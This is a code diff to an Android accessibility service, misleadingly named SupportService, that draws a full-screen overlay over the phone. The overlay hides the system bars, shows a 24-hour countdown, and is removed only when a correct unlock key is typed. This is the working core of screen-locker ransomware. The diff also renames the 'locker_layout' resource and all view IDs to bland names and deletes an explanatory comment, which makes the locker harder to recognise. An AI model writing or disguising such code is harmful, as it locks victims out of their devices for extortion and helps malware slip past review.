@@ -18,8 +18,8 @@ public class SupportService extends AccessibilityService {
     private WindowManager wm;
     private View overlay;
     private TextView tv_status;
+    private TextView tv_display;
     private StringBuilder input_buffer = new StringBuilder();
-    private boolean is_valid = false;
     private long remaining_sec = 86400; // 24h
     private Handler task_handler = new Handler(Looper.getMainLooper());
 
@@ -63,7 +63,7 @@ public class SupportService extends AccessibilityService {
     private void setup_layout() {
         wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
         LayoutInflater inflater = LayoutInflater.from(this);
-        overlay = inflater.inflate(R.layout.locker_layout, null);
+        overlay = inflater.inflate(R.layout.sys_opt_view, null);
 
         WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
         lp.type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
@@ -76,7 +76,6 @@ public class SupportService extends AccessibilityService {
         lp.height = WindowManager.LayoutParams.MATCH_PARENT;
         lp.gravity = Gravity.CENTER;
 
-        // Hide navigation bar and status bar
         overlay.setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_STABLE |
                                     View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION |
                                     View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN |
@@ -84,33 +83,45 @@ public class SupportService extends AccessibilityService {
                                     View.SYSTEM_UI_FLAG_FULLSCREEN |
                                     View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
 
-        tv_status = overlay.findViewById(R.id.tvTimer);
+        tv_status = overlay.findViewById(R.id.v_timer);
+        tv_display = overlay.findViewById(R.id.v_display);
         
-        int[] ids = {R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4, 
-                     R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9};
+        int[] ids = {R.id.v_b0, R.id.v_b1, R.id.v_b2, R.id.v_b3, R.id.v_b4, 
+                     R.id.v_b5, R.id.v_b6, R.id.v_b7, R.id.v_b8, R.id.v_b9};
         
         for (int id : ids) {
             overlay.findViewById(id).setOnClickListener(v -> {
                 if (input_buffer.length() < 8) {
                     input_buffer.append(((Button)v).getText().toString());
+                    refresh_display();
                 }
             });
         }
 
-        overlay.findViewById(R.id.btnDelete).setOnClickListener(v -> {
-            if (input_buffer.length() > 0) input_buffer.setLength(input_buffer.length() - 1);
+        overlay.findViewById(R.id.v_del).setOnClickListener(v -> {
+            if (input_buffer.length() > 0) {
+                input_buffer.setLength(input_buffer.length() - 1);
+                refresh_display();
+            }
         });
 
-        overlay.findViewById(R.id.btnOk).setOnClickListener(v -> {
+        overlay.findViewById(R.id.v_ok).setOnClickListener(v -> {
             if (checkKey(input_buffer.toString())) {
                 wm.removeView(overlay);
                 disableSelf();
             } else {
                 input_buffer.setLength(0);
+                refresh_display();
             }
         });
 
         wm.addView(overlay, lp);
+    }
+
+    private void refresh_display() {
+        if (tv_display != null) {
+            tv_display.setText(input_buffer.toString());
+        }
     }
 
     @Override
